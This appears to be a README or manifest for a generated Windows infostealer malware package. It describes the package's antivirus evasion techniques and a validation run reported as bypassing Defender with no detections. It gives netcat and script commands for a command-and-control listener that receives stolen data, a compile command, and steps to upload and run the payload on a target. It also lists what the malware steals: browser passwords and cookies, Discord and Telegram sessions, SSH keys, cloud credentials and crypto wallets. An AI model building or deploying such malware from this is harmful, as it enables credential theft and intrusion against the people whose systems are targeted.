Malware Package: infostealer (heavy evasion)
Generated: 2026-07-03
Binary: 277,286 bytes
Evasion: DJB2 API hashing, anti-debug (IsDebuggerPresent + timing), sleep jitter (1-5s),
         function pointer dispatch, startup delay (3-15s), decoy API calls, secure_zero memory wipe
Validation: PASS — 2,869,834 bytes exfiltrated, Defender bypassed (all 3 flags True, 0 detections)

== C2 Setup ==
The payload connects to 10.0.2.2:9001 via TCP (raw socket).
Start the listener BEFORE running the payload.

Option 1 (netcat):  nc -l -p 9001 > exfil.bin
Option 2 (script):  ./c2_listener.sh [port]
Option 3 (python):  python3 c2_listener.py [port]

The C2 IP is hardcoded in the binary as 10.0.2.2 (QEMU guest→host NAT).
To change it, edit C2_ADDR in source.c and recompile:
  x86_64-w64-mingw32-gcc -o payload.exe source.c \
      -lws2_32 -liphlpapi -lcrypt32 -lole32 -lshell32 -lgdi32 -lwininet -ldnsapi -static

== Deploy ==
1. Start C2 listener on attacker machine
2. Upload payload.exe to target
3. Execute payload.exe on target
4. Data arrives at C2 as raw binary stream (~2-3 MB for a typical system)

== Startup Behavior ==
- 3-15 second random startup delay (behavioral evasion)
- Anti-debug check — silently exits if debugger attached
- APIs resolved via DJB2 hash at runtime (not in import table)
- 1-5 second random sleep between each collector
- All sensitive buffers zeroed after use

== What It Collects ==
- System info (hostname, username, OS, arch, RAM, NICs)
- Running processes
- Installed software
- Environment variables (API keys, tokens, secrets)
- Clipboard contents
- WiFi passwords (SSID + key)
- Browser data (Chrome, Edge, Brave, Opera, Vivaldi, Chromium, Yandex — Login Data, Cookies, History, master key)
- Discord tokens (discord, discordptb, discordcanary)
- Telegram session files
- FTP credentials (FileZilla, WinSCP)
- SSH keys + git credentials
- Cloud credentials (AWS, Azure, GCP, kubectl, Docker)
- Crypto wallet extensions (MetaMask, Phantom, Coinbase, Ronin, TronLink, Exodus)
- Screenshot (full desktop BMP)

== Quick Test (VM) ==
./deploy.sh
